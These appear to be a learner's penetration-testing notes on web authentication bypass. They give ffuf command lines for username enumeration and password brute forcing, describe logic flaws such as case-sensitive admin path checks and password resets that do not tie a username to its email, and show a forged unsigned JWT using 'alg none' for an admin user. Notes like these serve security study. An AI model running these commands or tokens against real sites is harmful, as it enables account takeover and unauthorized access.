
# Username Enumeration
creating a list of valid usernames
a lot of websites return a Error message / HTTP Status which indicates that the username / email exists. e.g.:
- wrong password in login (and for other random (non existing) usernames there is another error message)
- username / emal already exists in registration

for emails you should use [Social Enigineering](../Social%20Enigineering.md) or [OSINT](OSINT.md)

for usernames:
Adjust Http method and fieldnames and error message and so on
`-mr` is the text on the page we are looking for to validate we've found a valid username. (match regular expression)
![](attachments/Pasted%20image%2020230602000640.png)
you can also specify specific http status codes with `-mc` 
```
ffuf -w WORDLIST -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u URL/customers/signup -mr "username already exists"
```


# Brute force

## BURP Intruder
[Intruder](Burp%20Suite.md#Intruder)

## FFUZ
create a file with valid usernames / emails from [Username Enumeration](Authetication%20Bypass.md#Username%20Enumeration) e.g. `valid_usernames.txt`

`W1` = list of valid usernames
`W2` = list of possible passwords
`-fc` = check for an HTTP status code other than 200
```
ffuf -w valid_usernames.txt:W1,:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u URL/customers/login -fc 200
```


# Logic Flaws
search for logic flaws in website

## Page validation
- PHP Backend validates if the user role of a user visiting an admin page only if the URL starts with `/admin`, but makes it case sensetive and you can change the request to a different case like `/adMin` 
```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```
- API password reset takes a username of the account and email to send the confimation link separately and does not check if they belong together or so on..

## Security Question
- When the security question can be easily guessed "What is you favourite color"

## Brute Force Protection
- reset password sends a 6 digit code
- brute force protection is just checking if the IP has XXX tries
- but the attacker can just switch the device

## re-register with existing username
- re-register with existing username
- trick with a trailing space " admin@URL", but the app will provide the JWT for the "admin@URL" account at login with " admin@URL"


# JWT Bypass
- we can decode all 3 parts of the JWT
- change alg in header to `none`
- change user (or other data) in payload
- encode base64
- concatenate Header and Payload with `.` -> HEADER.PAYLOAD. -> but WITHOUT signature e.g.: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjg2NzExODU0fQ==.`